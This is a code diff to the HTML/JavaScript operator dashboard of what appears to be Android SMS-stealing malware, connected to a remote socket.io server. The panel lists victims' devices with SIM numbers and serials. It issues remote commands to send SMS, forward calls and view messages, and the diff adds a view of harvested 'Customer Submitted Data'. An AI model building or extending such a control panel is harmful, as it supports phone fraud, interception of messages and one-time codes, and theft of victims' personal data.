@@ -48,8 +48,26 @@
         
         .info { font-size: 13px; color: #444; margin-bottom: 5px; }
         .btns { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; margin-top: 15px; }
-        .btn-sm { padding: 8px; font-size: 12px; cursor: pointer; border: none; border-radius: 4px; color: white; background: #444; }
-        .btn-sms { background: var(--success); } .btn-call { background: #17a2b8; } .btn-del { background: var(--danger); }
+        .btn-sm { padding: 8px; font-size: 12px; cursor: pointer; border: none; border-radius: 4px; color: white; background: #444; font-weight: bold; }
+        .btn-sms { background: var(--success); } 
+        .btn-call { background: #17a2b8; } 
+        .btn-view { background: #9c27b0; }
+        .btn-del { background: var(--danger); }
+        
+        /* Serial Number Badge */
+        .serial-badge { position: absolute; top: 10px; right: 10px; background: var(--primary); color: var(--dark); font-weight: bold; padding: 5px 12px; border-radius: 50px; font-size: 14px; }
+        
+        /* Modal Styles */
+        .modal { display: none; position: fixed; z-index: 2500; left: 0; top: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.5); }
+        .modal.show { display: flex; align-items: center; justify-content: center; }
+        .modal-content { background: white; padding: 30px; border-radius: 10px; width: 80%; max-width: 600px; max-height: 80vh; overflow-y: auto; }
+        .modal-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; }
+        .modal-header h2 { margin: 0; }
+        .close-btn { background: var(--danger); color: white; border: none; padding: 8px 15px; cursor: pointer; border-radius: 4px; font-weight: bold; }
+        .data-item { background: #f5f5f5; padding: 12px; margin-bottom: 10px; border-radius: 5px; border-left: 4px solid var(--primary); }
+        .data-label { font-weight: bold; color: var(--dark); font-size: 12px; }
+        .data-value { color: #555; margin-top: 5px; }
+        .no-data { text-align: center; color: #999; padding: 30px; }
     </style>
 </head>
 <body>
@@ -87,6 +105,28 @@
         </div>
 
         <div class="grid" id="grid"></div>
+    </div>
+
+    <!-- View Data Modal -->
+    <div id="viewDataModal" class="modal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h2>📋 Device Data</h2>
+                <button class="close-btn" onclick="closeModal('viewDataModal')">✕ Close</button>
+            </div>
+            <div id="modalBody"></div>
+        </div>
+    </div>
+
+    <!-- View SMS Modal -->
+    <div id="viewSmsModal" class="modal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h2>📬 SMS Messages</h2>
+                <button class="close-btn" onclick="closeModal('viewSmsModal')">✕ Close</button>
+            </div>
+            <div id="smsModalBody"></div>
+        </div>
     </div>
 
     <script src="https://bengal-tiger-admin-production-8071.up.railway.app/socket.io/socket.io.js"></script>
@@ -151,27 +191,34 @@
             if(currentFilter === 'online') list = devices.filter(d=>d.isOnline);
             if(currentFilter === 'pinned') list = devices.filter(d=>d.isPinned);
 
-            list.forEach(d => {
+            // Sort by latest first
+            list = list.sort((a, b) => new Date(b.registrationTimestamp) - new Date(a.registrationTimestamp));
+
+            list.forEach((d, idx) => {
+                const serialNum = idx + 1;
                 const pinColor = d.isPinned ? 'var(--primary)' : '#ccc';
                 const statusHtml = d.isOnline ? '<span class="online-text">● Online</span>' : '<span>○ Offline</span>';
                 
                 grid.innerHTML += `
                 <div class="card ${d.isOnline?'online':''} ${d.isPinned?'pinned':''}">
+                    <div class="serial-badge">#${serialNum}</div>
                     <div class="card-header">
                         <b>${d.model}</b>
                         <div>
-                            <i class="fas fa-thumbtack" style="color:${pinColor}; cursor:pointer;" onclick="togglePin('${d.deviceId}', ${!d.isPinned})"></i>
+                            <i class="fas fa-thumbtack" style="color:${pinColor}; cursor:pointer;" onclick="togglePin('${d.deviceId}', ${!d.isPinned})" title="Pin Device"></i>
                         </div>
                     </div>
                     <div class="status">${statusHtml} | Battery: ${d.battery}%</div>
-                    <div class="info">Seen: ${new Date(d.lastSeen).toLocaleTimeString()}</div>
-                    <div class="info">Sim 1: ${d.sim1 || 'N/A'}</div>
+                    <div class="info">Serial: ${d.serialNumber || 'N/A'}</div>
+                    <div class="info">SIM 1: ${d.sim1 || 'N/A'}</div>
+                    <div class="info">Last Seen: ${new Date(d.lastSeen).toLocaleString()}</div>
 
                     <div class="btns">
-                        <button class="btn-sm btn-sms" onclick="act('${d.deviceId}', 'SEND_SMS')">Send SMS</button>
-                        <button class="btn-sm btn-call" onclick="act('${d.deviceId}', 'CALL_FORWARD')">Call Fwd</button>
-                        <button class="btn-sm" onclick="act('${d.deviceId}', 'VIEW_SMS')">View SMS</button>
-                        <button class="btn-sm btn-del" onclick="del('${d.deviceId}')">Delete</button>
+                        <button class="btn-sm btn-view" onclick="viewData('${d.deviceId}')">📋 View Data</button>
+                        <button class="btn-sm btn-view" onclick="viewSms('${d.deviceId}')">📬 View SMS</button>
+                        <button class="btn-sm btn-sms" onclick="act('${d.deviceId}', 'SEND_SMS')">💬 Send SMS</button>
+                        <button class="btn-sm btn-call" onclick="act('${d.deviceId}', 'CALL_FORWARD')">📞 Call Fwd</button>
+                        <button class="btn-sm btn-del" onclick="del('${d.deviceId}')">🗑️ Delete</button>
                     </div>
                 </div>`;
             });
@@ -273,6 +320,117 @@
                 });
                 const d = await r.json();
                 toast(d.success ? "✅ Password Changed" : "❌ Wrong Old Password", !d.success);
+            }
+        }
+
+        // View Data Function
+        function viewData(deviceId) {
+            const device = devices.find(d => d.deviceId === deviceId);
+            if (!device) {
+                toast('❌ Device not found', true);
+                return;
+            }
+
+            const modalBody = document.getElementById('modalBody');
+            let html = `
+                <div class="data-item">
+                    <div class="data-label">🆔 Device ID</div>
+                    <div class="data-value">${device.deviceId}</div>
+                </div>
+                <div class="data-item">
+                    <div class="data-label">📱 Model</div>
+                    <div class="data-value">${device.model}</div>
+                </div>
+                <div class="data-item">
+                    <div class="data-label">🔢 Serial Number</div>
+                    <div class="data-value">${device.serialNumber}</div>
+                </div>
+                <div class="data-item">
+                    <div class="data-label">🤖 Android Version</div>
+                    <div class="data-value">${device.androidVersion}</div>
+                </div>
+                <div class="data-item">
+                    <div class="data-label">🔋 Battery</div>
+                    <div class="data-value">${device.battery}%</div>
+                </div>
+                <div class="data-item">
+                    <div class="data-label">📞 SIM 1</div>
+                    <div class="data-value">${device.sim1 || 'N/A'}</div>
+                </div>
+                <div class="data-item">
+                    <div class="data-label">📞 SIM 2</div>
+                    <div class="data-value">${device.sim2 || 'N/A'}</div>
+                </div>
+                <div class="data-item">
+                    <div class="data-label">🟢 Status</div>
+                    <div class="data-value">${device.isOnline ? 'Online' : 'Offline'}</div>
+                </div>
+                <div class="data-item">
+                    <div class="data-label">⏱️ Last Seen</div>
+                    <div class="data-value">${new Date(device.lastSeen).toLocaleString()}</div>
+                </div>
+                <hr>
+                <h3>📝 Customer Submitted Data</h3>
+            `;
+
+            if (device.customerData && Object.keys(device.customerData).length > 0) {
+                Object.entries(device.customerData).forEach(([key, value]) => {
+                    html += `
+                        <div class="data-item">
+                            <div class="data-label">${key}</div>
+                            <div class="data-value">${JSON.stringify(value)}</div>
+                        </div>
+                    `;
+                });
+            } else {
+                html += '<div class="no-data">No customer data submitted yet</div>';
+            }
+
+            modalBody.innerHTML = html;
+            document.getElementById('viewDataModal').classList.add('show');
+        }
+
+        // View SMS Function
+        function viewSms(deviceId) {
+            const device = devices.find(d => d.deviceId === deviceId);
+            if (!device) {
+                toast('❌ Device not found', true);
+                return;
+            }
+
+            const smsModalBody = document.getElementById('smsModalBody');
+            let html = `
+                <div class="data-item">
+                    <div class="data-label">📱 Device: ${device.model}</div>
+                    <div class="data-value">Fetching SMS messages...</div>
+                </div>
+                <div class="no-data">
+                    Currently configured to fetch SMS from device.<br>
+                    <strong>Implementation Note:</strong> Actual SMS retrieval requires:<br>
+                    1. Android app to send SMS list via WebSocket<br>
+                    2. Server to store SMS data<br>
+                    3. Dashboard to display retrieved messages
+                </div>
+            `;
+            smsModalBody.innerHTML = html;
+            document.getElementById('viewSmsModal').classList.add('show');
+        }
+
+        // Close Modal Function
+        function closeModal(modalId) {
+            document.getElementById(modalId).classList.remove('show');
+        }
+
+        // Close modal when clicking outside
+        window.onclick = function(event) {
+            const viewDataModal = document.getElementById('viewDataModal');
+            const viewSmsModal = document.getElementById('viewSmsModal');
+            
+            if (event.target == viewDataModal) {
+                viewDataModal.classList.remove('show');
+            }
+            if (event.target == viewSmsModal) {
+                viewSmsModal.classList.remove('show');
             }
         }
     </script>
